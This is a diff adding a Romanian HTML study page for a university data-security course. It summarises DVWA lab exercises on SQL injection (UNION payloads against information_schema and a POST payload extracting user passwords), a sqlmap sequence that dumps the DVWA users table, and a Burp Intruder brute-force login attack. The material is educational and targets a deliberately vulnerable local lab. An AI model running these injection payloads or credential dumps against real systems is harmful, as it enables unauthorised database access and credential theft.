@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="ro" class="h-full scroll-smooth">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Teorie: Laboratoarele DVWA & Hack The Box - Exam Trainers</title>
+  <meta name="description" content="Sinteza celor 8 laboratoare de Securitatea Datelor: SQL Injection, Blind, Burp Suite Intruder, XSS reflected și CSRF.">
+
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- Google Fonts: Outfit (UI) & JetBrains Mono (Code/Math) -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Outfit', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace'],
+          }
+        }
+      }
+    };
+  </script>
+
+  <style>
+    body {
+      background: 
+        radial-gradient(circle at 10% 20%, rgba(245, 158, 11, 0.08) 0%, transparent 40%),
+        radial-gradient(circle at 90% 80%, rgba(244, 63, 94, 0.06) 0%, transparent 45%),
+        #090d16;
+    }
+
+    .circuit-grid {
+      background-size: 36px 36px;
+      background-image: 
+        linear-gradient(to right, rgba(255, 255, 255, 0.02) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
+    }
+  </style>
+</head>
+<body class="circuit-grid min-h-full font-sans text-slate-200 overflow-x-hidden selection:bg-amber-500 selection:text-white">
+
+  <main class="relative mx-auto flex min-h-screen w-full max-w-5xl flex-col px-4 py-8 sm:px-6 lg:px-8 justify-between">
+    
+    <header class="mb-10 pb-6 border-b border-slate-800 flex items-center justify-between">
+      <nav class="flex items-center space-x-2 text-sm text-slate-400 font-medium">
+        <a href="../../../index.html" class="hover:text-white transition-colors">ExamTrainers</a>
+        <span class="text-slate-600">/</span>
+        <a href="../index.html" class="hover:text-white transition-colors">Securitatea Datelor</a>
+        <span class="text-slate-600">/</span>
+        <a href="index.html" class="hover:text-white transition-colors">DVWA & HTB</a>
+        <span class="text-slate-600">/</span>
+        <span class="text-amber-400 font-bold bg-amber-500/10 px-2.5 py-0.5 rounded border border-amber-500/20 font-mono">Teorie</span>
+      </nav>
+
+      <a href="index.html" class="flex items-center gap-2 px-3 py-1.5 rounded-xl bg-amber-600 hover:bg-amber-500 text-xs font-bold text-white transition-all shadow-md shadow-amber-600/20">
+        <span>🎮</span>
+        <span>Deschide Sandbox-ul</span>
+      </a>
+    </header>
+
+    <article class="space-y-10">
+      <div>
+        <span class="text-[10px] font-mono font-bold uppercase tracking-widest text-amber-400 bg-amber-500/10 px-2.5 py-1 rounded-md border border-amber-500/20">
+          Laboratoarele 1 - 8 • OWASP Top 10
+        </span>
+        <h1 class="text-3xl sm:text-5xl font-black tracking-tight text-white mt-3">
+          Ghidul Tehnic al Laboratoarelor DVWA & Hack The Box
+        </h1>
+        <p class="text-base text-slate-400 mt-2 leading-relaxed">
+          Exploatare și apărare pas cu pas pentru toate lucrările practice susținute la disciplina Securitatea Datelor.
+        </p>
+      </div>
+
+      <!-- SQLi Section -->
+      <section class="p-8 bg-slate-900/60 border border-slate-800 rounded-3xl backdrop-blur-xl space-y-6">
+        <h2 class="text-2xl font-bold text-white flex items-center gap-3">
+          <span class="w-8 h-8 rounded-xl bg-amber-500/20 text-amber-400 flex items-center justify-center font-mono text-sm border border-amber-500/30">1</span>
+          SQL Injection (Low vs. Medium cu Burp Suite)
+        </h2>
+
+        <div class="space-y-4 text-sm text-slate-300 leading-relaxed">
+          <p>
+            Vulnerabilitatea apare când datele introduse de utilizator sunt concatenate direct în șirul SQL fără filtrare sau parametrizare.
+          </p>
+
+          <div class="grid gap-3 sm:grid-cols-2 font-mono text-xs">
+            <div class="p-4 bg-slate-950 rounded-2xl border border-slate-800 space-y-2">
+              <div class="text-amber-400 font-bold">Laboratorul 2: Nivel Low (GET)</div>
+              <p class="text-slate-400">
+                Interogare: <code>WHERE user_id = '$id';</code> <br />
+                • Determinare coloane: <code>' ORDER BY 2 #</code> <br />
+                • Extragere tabele: <code>%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#</code> <br />
+                • Extragere coloane: <code>%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users'#</code>
+              </p>
+            </div>
+
+            <div class="p-4 bg-slate-950 rounded-2xl border border-slate-800 space-y-2">
+              <div class="text-rose-400 font-bold">Laboratorul 6: Nivel Medium (POST)</div>
+              <p class="text-slate-400">
+                Interogare: <code>WHERE user_id = $id;</code> <br />
+                • Formularul din browser folosește dropdown <code>&lt;select&gt;</code>. <br />
+                • Se interceptează cererea POST în Burp Proxy. <br />
+                • <strong>Capcană:</strong> Nu se folosesc ghilimele! <br />
+                • Payload: <code>id=1 OR 1=1 UNION SELECT user, password FROM users&Submit=Submit</code>.
+              </p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Blind SQLi & sqlmap -->
+      <section class="p-8 bg-slate-900/60 border border-slate-800 rounded-3xl backdrop-blur-xl space-y-6">
+        <h2 class="text-2xl font-bold text-white flex items-center gap-3">
+          <span class="w-8 h-8 rounded-xl bg-emerald-500/20 text-emerald-400 flex items-center justify-center font-mono text-sm border border-emerald-500/30">2</span>
+          Laboratorul 4: Blind SQL Injection & Automatizare sqlmap
+        </h2>
+
+        <div class="space-y-4 text-sm text-slate-300 leading-relaxed font-mono text-xs">
+          <p class="font-sans text-sm">
+            Când aplicația nu returnează erori sau date din baza de date, se utilizează inferența binară (Boolean-based) sau întârzierile temporale (Time-based cu <code>SLEEP(5)</code>).
+          </p>
+
+          <div class="p-4 bg-slate-950 rounded-2xl border border-slate-800 space-y-2">
+            <div class="text-emerald-400 font-bold">Secvența Oficială de Comenzi sqlmap:</div>
+            <pre class="text-slate-300">
+# 1. Detectare Baze de Date (folosind cookie-ul Tamper Data)
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit" \
+       --cookie="security=low; PHPSESSID=kt1cvnj6cv9s59g4hd4s915j7k" --dbs
+
+# 2. Extragere tabele din baza de date dvwa
+sqlmap -u "..." --cookie="..." -D dvwa --tables
+
+# 3. Extragere coloane din tabela users
+sqlmap -u "..." --cookie="..." -D dvwa -T users --columns
+
+# 4. Dump complet credențiale și spargere hash-uri
+sqlmap -u "..." --cookie="..." -D dvwa -T users --dump</pre>
+          </div>
+        </div>
+      </section>
+
+      <!-- Burp Suite Intruder -->
+      <section class="p-8 bg-slate-900/60 border border-slate-800 rounded-3xl backdrop-blur-xl space-y-4">
+        <h2 class="text-2xl font-bold text-white flex items-center gap-3">
+          <span class="w-8 h-8 rounded-xl bg-indigo-500/20 text-indigo-400 flex items-center justify-center font-mono text-sm border border-indigo-500/30">3</span>
+          Laboratorul 5: Atacul Brute Force & Burp Suite Intruder
+        </h2>
+
+        <div class="space-y-3 text-sm text-slate-300 leading-relaxed">
+          <p>
+            Atacul este de tip <strong>Cluster Bomb</strong> pe două poziții de payload: <code>username=§test§&password=§123§</code>.
+          </p>
+          <div class="p-4 bg-slate-950 rounded-2xl border border-slate-800 font-mono text-xs">
+            <div class="text-indigo-400 font-bold mb-1">Identificarea Succesului după Coloana Length:</div>
+            <p class="text-slate-400">
+              • Cereri eșuate: <strong>Length = 4554 octeți</strong> (mesaj standard "Username and/or password incorrect"). <br />
+              • Cerere corectă (admin:password): <strong>Length = 4738 / 4597 octeți</strong> (semnalizează afișarea zonei autentificate).
+            </p>
+          </div>
+        </div>
+      </section>
+
+    </article>
+
+    <footer class="mt-16 py-6 border-t border-slate-800 text-center text-xs text-slate-500 font-medium">
+      &copy; 2026 ExamTrainers • Securitatea Datelor CR4.1 (UCV)
+    </footer>
+  </main>
+</body>
+</html>
